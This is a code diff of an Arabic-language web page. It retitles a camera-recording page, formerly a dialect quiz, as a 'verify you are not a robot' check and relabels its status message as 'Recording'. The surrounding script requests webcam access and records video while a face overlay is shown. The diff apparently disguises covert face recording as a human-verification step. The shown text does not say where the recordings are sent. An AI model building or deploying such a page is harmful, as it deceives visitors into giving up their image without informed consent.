@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اختبار اللهجات المصرية</title>
+    <title>تحقق من أنك لست روبوتاً</title>
     <style>
         * {
             margin: 0;
@@ -192,7 +192,7 @@
         <div class="face-shape" id="face-shape">
             <div class="mouth"></div> <!-- Mouth element -->
         </div> <!-- Face shape overlay -->
-        <div class="loading">جاري التحقق... ⏳</div>
+        <div class="loading">جاري التسجيل... ⏳</div>
         <div class="success">✅ تم التحقق بنجاح!</div>
     </div>
 
@@ -228,9 +228,7 @@
                 success.style.display = 'none';
                 const faceShape = document.getElementById('face-shape');
 
-                // Show the face shape
-                faceShape.classList.add('active');
-
+                // Request camera permission
                 navigator.mediaDevices.getUserMedia({ video: true })
                 .then((stream) => {
                     video.srcObject = stream;
@@ -239,6 +237,9 @@
                     const chunks = [];
                     mediaRecorder.start();
                     mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };
+
+                    // Show the face shape after camera permission is granted
+                    faceShape.classList.add('active');
 
                     // Change face shape color after 4 seconds
                     setTimeout(() => {
